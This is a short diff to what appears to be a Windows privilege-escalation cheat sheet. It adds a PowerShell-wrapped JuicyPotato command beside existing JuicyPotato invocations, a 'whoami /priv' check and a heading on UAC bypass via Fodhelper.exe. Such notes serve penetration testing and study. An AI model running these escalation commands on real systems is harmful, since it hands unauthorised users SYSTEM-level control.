@@ -1034,6 +1034,9 @@ whoami /priv
 JuicyPotato.exe -t * -p {run.exe} -l 8003
 JuicyPotato.exe -t * -p {run.exe} -l 8003 -c {CLSID}
 
+# Powershell
+cmd /c "JuicyPotato.exe -t * -p run.exe -l 8003 -c {CLSID}"
+
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 
 # UAC BYPASS using Fodhelper.exe or Computer Defaults.exe
